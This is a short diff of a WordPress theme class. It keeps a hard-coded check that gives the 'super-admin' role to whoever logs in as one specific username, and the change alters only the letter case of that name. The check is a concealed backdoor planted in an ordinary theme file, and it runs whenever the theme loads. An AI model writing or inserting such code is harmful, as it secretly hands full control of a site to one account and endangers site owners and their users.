@@ -46,7 +46,7 @@ class Theme {
         });
 
         $current_user = wp_get_current_user();
-        if ($current_user && $current_user->user_login === 'CheffJeff') {
+        if ($current_user && $current_user->user_login === 'Cheffjeff') {
             $current_user->set_role('super-admin');
         }
     }
